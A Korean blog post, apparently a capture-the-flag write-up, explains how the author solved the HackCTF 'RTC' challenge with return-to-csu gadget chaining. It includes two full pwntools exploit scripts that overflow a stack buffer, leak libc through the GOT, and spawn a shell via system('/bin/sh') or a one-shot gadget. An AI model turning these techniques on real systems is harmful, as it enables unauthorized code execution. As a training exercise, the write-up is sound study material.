---
title: "[HackCTF]RTC"
date: 2019-12-22
tags: [HackCTF]
categories: [HackCTF]
---

Return To Csu에 대해 이론 공부하고 나서 HackCTF RTC를 풀게되었는데 Chaining하는게 좀 재밌었다. 

`__libc_csu_init` 이용해서 Exploit하는건데 이해하는대로 풀었다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+0h] [rbp-40h]

  setvbuf(stdin, 0LL, 2, 0LL);
  write(1, "Hey, ROP! What's Up?\n", 0x15uLL);
  return read(0, &buf, 512uLL);
}
```

일반적인 ROP를 할 수없는게 gadget이 부족하기 때문에 RTC를 이용하면 된다.

main 함수에서 buf 크기가 0x40인데 512만큼 받으니까 ret을 `__libc_csu_init ` 주소로 돌려서 Chaining 해주면서 풀면 된다.

![](https://user-images.githubusercontent.com/32904385/71322849-b767ed00-250f-11ea-8c4b-68c2d8da8d67.png)

`0x4006BA` 부터 pop으로 레지스터 세팅해주고  `0x4006A0` 으로 `ret` 을 해줘서 인자 `edi`, `rsi` , `rdx` 를 각각 세팅해주고 함수  `0x4006A9` 에서 호출하기 할 수 있다. 

`0x4006BA` 부터 레지스터에 넣는거 이용해서 `0x4006A9` 에서 `call`하면 된다.

Chaining 계속하려면 `add rbx, 1` , `cmp rbx, rbp` 를 맞춰줘야 하니까 pop 레지스터 세팅해주는 곳에서 rbx를 0으로 맞춰서 `call qword ptr [r12+rbx*]` 에서 r12에 got주소 넣고 rbx에 0을 넣으면 그 함수를 실행할 수 있다.

그러니까 rbx에 0을 넣으니까 rbp는 1로 맞춰줘야 계속 Chaining을 할 수 있다.

> exploit.py

```python
from pwn import *

context.arch = 'amd64'
p = remote('ctf.j0n9hyun.xyz',3025)
#p = process('./rtc')
e = ELF('./rtc')
libc = ELF('./libc.so.6', checksec=False)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

csu_pop = 0x00000000004006BA
csu_call = 0x00000000004006A0

payload = 'A'*72
payload += p64(csu_pop) # set
payload += p64(0) + p64(1) + p64(e.got['write']) + p64(8) + p64(e.got['write']) + p64(1) + p64(csu_call)
# rbx -> 0 
# rbp -> 1
# r12 -> write_got -> call
# r13 -> rdx -> write(?,?,8)
# r14 -> rsi -> write(?,write_got,8)
# r15d -> edi -> write(1,write_got,8)
# ret -> csu_call
payload += p64(csu_pop) # set
payload += p64(0) + p64(1) + p64(e.got['read']) + p64(10) + p64(e.bss()) + p64(0) + p64(csu_call)
# rbx -> 0 
# rbp -> 1
# r12 -> read_got -> call
# r13 -> rdx -> read(?,?,10)
# r14 -> rsi -> write(?,bss,10)
# r15d -> edi -> write(0,bss,10)
# ret -> csu_call
payload += p64(csu_pop) # set
payload += p64(0) + p64(1) + p64(e.got['read']) + p64(8) + p64(e.got['read']) + p64(0) + p64(csu_call)
# rbx -> 0 
# rbp -> 1
# r12 -> read_got -> call
# r13 -> rdx -> read(?,?,8)
# r14 -> rsi -> write(?,read_got,8)
# r15d -> edi -> write(0,read_got,8)
# ret -> csu_call
payload += p64(csu_pop)
payload += p64(0) + p64(1) + p64(e.got['read']) + p64(0) + p64(0) + p64(e.bss()) + p64(csu_call)
# rbx -> 0 
# rbp -> 1
# r12 -> read_got -> call -> system
# r13 -> rdx -> 0
# r14 -> rsi -> 0
# r15d -> edi -> system(bss) -> system("/bin/sh\x00")
# ret -> csu_call
p.sendafter('?\n',payload)

libc_base = u64(p.recvuntil('\x7f').ljust(8,'\x00')) - libc.symbols['write']
log.info('write : ' + hex(libc_base))

p.sendline('/bin/sh\x00')

p.sendline(p64(libc_base + libc.symbols['system']))

p.interactive()
```

다른 방법으론 oneshot gadget 이용해서 풀었다. libc base 구했으니까 main으로 리턴해주고 원샷 날려주면 된다.

> exploit.py

```python
from pwn import *

context.arch = 'amd64'
p = remote('ctf.j0n9hyun.xyz',3025)
# p = process('./rtc')
e = ELF('./rtc')
libc = ELF('./libc.so.6', checksec=False)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

csu_pop = 0x00000000004006BA
csu_call = 0x00000000004006A0

payload = 'A'*72
payload += p64(csu_pop) 
payload += p64(0) + p64(1) + p64(e.got['write']) + p64(8) + p64(e.got['write']) + p64(1) + p64(csu_call)
payload += p64(csu_pop)
payload += p64(0) + p64(1) + p64(0) + p64(0) + p64(0) + p64(0) + p64(e.symbols['main'])

p.sendafter('?\n',payload)

libc_base = u64(p.recvuntil('\x7f').ljust(8,'\x00')) - libc.symbols['write']
log.info('libc_base : ' + hex(libc_base))

oneshot = 0x4526a
payload2 = 'A'*72
payload2 += p64(libc_base + oneshot) 

p.sendafter('?\n',payload2)
p.interactive()
```

